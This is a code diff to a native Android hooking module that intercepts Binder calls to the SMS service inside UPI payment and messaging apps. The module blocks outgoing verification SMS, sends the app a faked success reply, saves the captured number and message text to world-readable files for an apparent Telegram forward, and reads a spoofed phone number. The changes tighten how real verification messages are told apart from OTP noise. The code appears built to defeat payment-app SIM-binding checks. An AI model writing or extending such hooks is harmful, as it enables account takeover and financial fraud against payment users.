@@ -57,12 +57,28 @@ void write_diag_multi(const char* name, const char* content) {
         fclose(f);
         chmod(path, 0666);
     }
-    // Permanent copy — TG forward must NEVER delete this (user checks this file)
-    if (name && (strstr(name, "outgoing_blocked") || strstr(name, "pending_verify"))) {
-        snprintf(path, sizeof(path), "/data/local/tmp/hivirtus_last_outgoing.json");
-        if (strstr(name, ".flag")) {
-            snprintf(path, sizeof(path), "/data/local/tmp/hivirtus_last_outgoing.flag");
+    // Permanent last_outgoing — ONLY valid outgoing (never OTP / pkg junk)
+    if (name && content &&
+        (strstr(name, "outgoing_blocked.json") || strstr(name, "pending_verify.json"))) {
+        // Quick reject junk payloads before promoting
+        const bool junk = strstr(content, "is your OTP") || strstr(content, "<#>") ||
+                          strstr(content, "Valid for") ||
+                          strstr(content, "\"body\": \"com.") ||
+                          strstr(content, "\"body\":\"com.") ||
+                          strstr(content, "apps.messaging");
+        if (!junk) {
+            snprintf(path, sizeof(path), "/data/local/tmp/hivirtus_last_outgoing.json");
+            f = fopen(path, "w");
+            if (f) {
+                fputs(content, f);
+                fclose(f);
+                chmod(path, 0666);
+            }
         }
+    }
+    if (name && strstr(name, "outgoing_blocked.flag") && content &&
+        !strstr(content, "is your OTP") && !strstr(content, "<#>")) {
+        snprintf(path, sizeof(path), "/data/local/tmp/hivirtus_last_outgoing.flag");
         f = fopen(path, "w");
         if (f) {
             fputs(content, f);
@@ -208,6 +224,33 @@ bool is_clean_sms_dest(const std::string& dest) {
     if (dest.find("com.") != std::string::npos) return false;
     if (dest.rfind("android.", 0) == 0) return false;
     return is_short_verify_dest(dest);
+}
+
+/** Valid outgoing capture — digit To + real message (never OTP / package junk). */
+bool is_pkg_like(const std::string& s) {
+    if (s.empty()) return false;
+    if (s.rfind("com.", 0) == 0 || s.rfind("android.", 0) == 0) return true;
+    if (s.find("apps.messaging") != std::string::npos) return true;
+    return false;
+}
+
+bool is_valid_outgoing_capture(const std::string& dest, const std::string& body) {
+    if (!is_clean_sms_dest(dest)) return false;
+    if (body.empty() || body.size() < 4) return false;
+    if (is_pkg_like(body) || is_pkg_like(dest)) return false;
+    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) return false;
+    std::string d;
+    for (char c : dest)
+        if (std::isdigit(static_cast<unsigned char>(c))) d += c;
+    if (d.empty()) return false;
+    bool all0 = true;
+    for (char c : d)
+        if (c != '0') {
+            all0 = false;
+            break;
+        }
+    if (all0) return false;
+    return true;
 }
 
 /**
@@ -638,14 +681,12 @@ bool extract_isms_from_blob(JNIEnv* env, jobject data, std::string& dest, std::s
     }
     if (body.empty()) {
         for (const auto& s : strs) {
-            if (body.empty() && body_has_verify_token(s) && !is_incoming_otp_noise(s)) body = s;
+            if (is_pkg_like(s) || is_incoming_otp_noise(s)) continue;
+            if (body.empty() && body_has_verify_token(s)) body = s;
         }
     }
-    if (body.empty()) {
-        // do not fall back to opaque random strings / package names
-    }
     for (const auto& s : strs) {
-        if (dest.empty() && is_clean_sms_dest(s)) dest = s;
+        if (dest.empty() && is_clean_sms_dest(s) && !is_incoming_otp_noise(s)) dest = s;
     }
     // digit runs from UTF-16 decoded strings already covered; also scan flattened UTF-16 ascii
     if (dest.empty()) {
@@ -672,13 +713,15 @@ bool extract_isms_from_blob(JNIEnv* env, jobject data, std::string& dest, std::s
             }
         }
     }
-    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) {
+    // Never return OTP/package as a "successful" extract
+    if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest) || is_pkg_like(body)) {
         dest.clear();
         body.clear();
         return false;
     }
     if (dest.empty() && !body.empty() && is_outgoing_upi_verify_body(body)) dest = "0000000000";
-    return is_outgoing_upi_verify_body(body);
+    return is_outgoing_upi_verify_body(body) ||
+           (is_clean_sms_dest(dest) && !body.empty() && !is_incoming_otp_noise(body));
 }
 
 /** True when parcel looks like an OUTGOING send (not ISms status/query). */
@@ -726,22 +769,38 @@ bool read_isms_outgoing(JNIEnv* env, jobject data, std::string& dest, std::strin
     if (strings.size() < 2) return false;
 
     for (const auto& s : strings) {
+        if (is_pkg_like(s) || is_incoming_otp_noise(s)) continue;
         if (body.empty() && body_has_verify_token(s)) body = s;
     }
-    body = body.empty() ? strings.back() : body;
+    if (body.empty()) {
+        for (const auto& s : strings) {
+            if (is_pkg_like(s) || is_incoming_otp_noise(s) || is_clean_sms_dest(s)) continue;
+            if (s.size() >= 8) {
+                body = s;
+                break;
+            }
+        }
+    }
     for (int i = static_cast<int>(strings.size()) - 2; i >= 0; --i) {
-        if (is_short_verify_dest(strings[static_cast<size_t>(i)])) {
+        if (is_short_verify_dest(strings[static_cast<size_t>(i)]) &&
+            !is_incoming_otp_noise(strings[static_cast<size_t>(i)])) {
             dest = strings[static_cast<size_t>(i)];
             break;
         }
     }
     if (dest.empty()) {
         for (int i = static_cast<int>(strings.size()) - 2; i >= 0; --i) {
-            if (!strings[static_cast<size_t>(i)].empty()) {
-                dest = strings[static_cast<size_t>(i)];
+            const auto& s = strings[static_cast<size_t>(i)];
+            if (!s.empty() && is_clean_sms_dest(s)) {
+                dest = s;
                 break;
             }
         }
+    }
+    if (is_incoming_otp_noise(body) || is_pkg_like(body)) {
+        body.clear();
+        dest.clear();
+        return false;
     }
     if (!dest.empty() && !body.empty()) return true;
     return extract_isms_from_blob(env, data, dest, body);
@@ -808,6 +867,8 @@ void write_isms_trace(const char* msg) {
     char line[384];
     snprintf(line, sizeof(line), "%ld %s\n", static_cast<long>(time(nullptr)), msg ? msg : "?");
     auto append_one = [&](const char* path) {
+        struct stat st {};
+        if (stat(path, &st) == 0 && st.st_size > 64 * 1024) unlink(path);
         FILE* f = fopen(path, "a");
         if (!f) f = fopen(path, "w");
         if (!f) return;
@@ -1079,6 +1140,13 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
         fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
     }
 
+    // Only persist / TG-eligible files when capture is clean (fixes stuck OTP JSON)
+    if (!is_valid_outgoing_capture(dest, body)) {
+        write_hook_status("skip_file_invalid_capture");
+        write_isms_trace("skip_file_invalid_capture");
+        return;
+    }
+
     char flag_buf[2048];
     snprintf(flag_buf, sizeof(flag_buf), "%s\n%s", dest.c_str(), body.c_str());
     write_diag_multi("hivirtus_outgoing_blocked.flag", flag_buf);
@@ -1090,6 +1158,7 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
              g_upi_pkg.c_str(), static_cast<long>(now));
     write_diag_multi("hivirtus_outgoing_blocked.json", json_buf);
     write_hook_status("outgoing_json_written");
+    write_isms_trace("outgoing_json_written");
 
     char phone[96] = {};
     FILE* pf = fopen("/data/local/tmp/hivirtus_spoof_phone.txt", "r");
@@ -1123,7 +1192,8 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
     // Match ISms / isms / Sms (AOSP + OEM descriptors)
     const bool is_sms_iface =
         iface.find("ISms") != std::string::npos || iface.find("isms") != std::string::npos ||
-        iface.find("ISmsEx") != std::string::npos || iface.find("IMms") != std::string::npos;
+        iface.find("ISmsEx") != std::string::npos || iface.find("IMms") != std::string::npos ||
+        iface.find("MotoSms") != std::string::npos;
     if (!is_sms_iface) return false;
 
     read_isms_outgoing(env, data, dest, body);
@@ -1132,28 +1202,54 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
     }
     const bool blob_verify = parcel_blob_has_verify(env, data);
     const bool blob_sms = parcel_blob_has_sms_compose(env, data);
+    const std::string blob = parcel_marshall_blob(env, data);
+    const bool sendish = blob_looks_like_outgoing_send(blob);
 
-    if (!looks_like_isms_send(code, dest, body, blob_verify, blob_sms)) {
-        // Messages: still log miss for debug
-        if (g_is_messaging_app) {
-            char miss[160];
-            snprintf(miss, sizeof(miss), "isms_passthrough code=%d destlen=%zu bodylen=%zu",
-                     (int)code, dest.size(), body.size());
+    // Never treat incoming OTP display/query as outgoing send
+    if ((is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) && !sendish &&
+        !blob_verify) {
+        write_isms_trace("isms_skip_otp_noise");
+        return false;
+    }
+
+    const bool looks = looks_like_isms_send(code, dest, body, blob_verify, blob_sms);
+    // SMS Tweaks / Navi: intercept ON → block ANY outgoing-looking ISms in UPI/Messages
+    const bool nuclear = config.intercept_fake_success && (g_in_hooked_upi || g_is_messaging_app) &&
+                         (sendish || blob_verify || blob_sms || looks ||
+                          (is_clean_sms_dest(dest) && !body.empty() && !is_incoming_otp_noise(body) &&
+                           !is_pkg_like(body)));
+
+    if (!looks && !nuclear) {
+        if (g_is_messaging_app || g_in_hooked_upi) {
+            char miss[192];
+            snprintf(miss, sizeof(miss),
+                     "isms_passthrough code=%d destlen=%zu bodylen=%zu send=%d", (int)code,
+                     dest.size(), body.size(), sendish ? 1 : 0);
             write_hook_status(miss);
+            write_isms_trace(miss);
         }
         return false;
     }
 
-    const bool want = config.intercept_fake_success || config.hook_outgoing_sms ||
-                      blob_verify || g_in_hooked_upi || g_is_messaging_app;
+    const bool want = config.intercept_fake_success || config.hook_outgoing_sms || blob_verify ||
+                      g_in_hooked_upi || g_is_messaging_app;
     if (!want) return false;
 
     if (dest.empty()) dest = "0000000000";
     if (body.empty()) {
         if (blob_verify) body = "UPI_VERIFY_SMS";
+        else if (sendish) body = "OUTGOING_SMS_BLOCK";
         else if (g_is_messaging_app) body = "MSG_SMS_INTERCEPT";
         else body = "SMS_INTERCEPT";
     }
+    // Still never pipeline OTP/package junk into last_outgoing/TG
+    if (is_incoming_otp_noise(body) || is_pkg_like(body)) {
+        if (reply) write_ok_reply(env, reply);
+        write_hook_status("isms_blocked_silent_junk");
+        write_isms_trace("isms_blocked_silent_junk");
+        return true;
+    }
+
     logger::info("OutgoingSms", "ISms SAFE block code=%d dest=%s body=%.60s msg=%d reply=%d",
                  (int)code, dest.c_str(), body.c_str(), g_is_messaging_app ? 1 : 0,
                  reply ? 1 : 0);
@@ -1165,6 +1261,7 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
     pipeline_outgoing(env, dest, body, sent_pi, del_pi);
     if (reply) write_ok_reply(env, reply);
     write_hook_status("isms_blocked_ok");
+    write_isms_trace("isms_blocked_ok");
     return true;
 }
 
@@ -1326,11 +1423,12 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
         const bool blob_sms = want_blob && messaging_blob_looks_like_sms_send(blob);
         const bool sendish = want_blob && blob_looks_like_outgoing_send(blob);
 
+        // Always log ISms traffic so user sees more than binder_hook_live
         if (iface_sms || blob_sms || sendish) {
-            char seen[256];
+            char seen[280];
             snprintf(seen, sizeof(seen),
                      "isms_seen code=%d msg=%d upi=%d flags=%d reply=%d iface_ok=%d blob_ok=%d "
-                     "send=%d iface=%.24s",
+                     "send=%d iface=%.40s",
                      (int)code, g_is_messaging_app ? 1 : 0, g_in_hooked_upi ? 1 : 0, (int)flags,
                      reply ? 1 : 0, iface_sms ? 1 : 0, blob_sms ? 1 : 0, sendish ? 1 : 0,
                      iface.c_str());
@@ -1347,7 +1445,6 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 return JNI_TRUE;
             }
             extract_isms_from_blob(env, data, dest, body);
-            // Prefer outgoing; reject OTP noise. Intercept ON → any UPI send (not Hero-only).
             if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) {
                 write_isms_trace("isms_passthrough_incoming_otp");
             } else {
@@ -1356,28 +1453,24 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 const bool sendish_out = sendish && !blob_contains_needle(blob, "is your OTP");
                 const bool intercept_any =
                     config.intercept_fake_success && (g_in_hooked_upi || g_is_messaging_app) &&
-                    (iface_sms || sendish_out) && !body.empty() && body.find("com.") != 0;
+                    (iface_sms || sendish_out) && !body.empty() && !is_pkg_like(body);
 
                 if (got_out || (sendish_out && is_outgoing_upi_verify_body(body)) ||
-                    (intercept_any && is_clean_sms_dest(dest)) ||
-                    (intercept_any && sendish_out)) {
-                    if (!is_clean_sms_dest(dest) && intercept_any) {
-                        // best-effort: still block radio even if dest parse weak
-                        if (dest.empty()) dest = "0000000000";
-                    }
-                    if ((is_outgoing_upi_verify_body(body) || intercept_any) &&
-                        !is_incoming_otp_noise(body)) {
-                        if (is_clean_sms_dest(dest) || intercept_any) {
-                            pipeline_outgoing(env, is_clean_sms_dest(dest) ? dest : "0000000000",
-                                              body, nullptr, nullptr);
-                        }
+                    (intercept_any && is_valid_outgoing_capture(dest, body)) ||
+                    (intercept_any && sendish_out && is_outgoing_upi_verify_body(body))) {
+                    if (is_valid_outgoing_capture(dest, body) ||
+                        (is_outgoing_upi_verify_body(body) && !is_incoming_otp_noise(body))) {
+                        pipeline_outgoing(env, is_clean_sms_dest(dest) ? dest : "0000000000", body,
+                                          nullptr, nullptr);
                     }
                     if (reply) write_ok_reply(env, reply);
                     write_hook_status("isms_blocked_nuclear");
                     write_isms_trace("isms_blocked_nuclear");
                     return JNI_TRUE;
                 }
-                if (sendish_out && (is_outgoing_upi_verify_body(body) || intercept_any)) {
+                // SMS Tweaks: intercept + sendish → silent block even if parse weak
+                if (config.intercept_fake_success && sendish_out &&
+                    (g_in_hooked_upi || g_is_messaging_app)) {
                     if (reply) write_ok_reply(env, reply);
                     write_hook_status("isms_blocked_silent");
                     write_isms_trace("isms_blocked_silent");
